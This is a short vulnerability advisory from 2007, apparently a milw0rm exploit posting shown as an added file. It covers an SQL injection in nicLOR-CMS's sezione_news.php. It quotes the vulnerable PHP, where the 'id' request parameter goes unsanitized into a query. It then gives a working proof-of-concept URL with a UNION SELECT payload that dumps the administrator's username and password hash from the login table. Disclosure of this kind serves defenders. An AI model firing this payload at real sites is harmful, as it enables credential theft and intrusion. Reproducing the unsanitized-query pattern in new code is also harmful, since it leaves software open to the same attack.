@@ -1,0 +1,27 @@
+Name            :  nicLOR-CMS SQL Injection Vulnerability.
+Author          :  x0kster
+Email           :  x0kster@gmail.com
+Script Download :  http://www.niclor.net/prodotti/16-04-06-niclor_cms.zip
+Date            :  21/12/2007
+
+#SQL Injection in sezione_news.php
+
+   <?php
+   [...]
+   $intSezioneID = $_GET['id'];
+   [...]
+   $strSQL = "SELECT articolo.intArticoloID, "
+           . "[...]"        
+           . " HAVING articolo.intSezioneID = $intSezioneID"
+           . "[...]";
+   [...]
+   ?>
+
+  So we can exploit the $intSezioneID and execute an sql injection.
+
+  PoC:
+  http://example.com/nicLOR-CMS/index.php?page=sezione&id=-1+union+select+1,concat(strUser,0x3a,strPass)+from+login/*
+
+  And then we'll get the username and the hash of the admin.
+
+# milw0rm.com [2007-12-21]
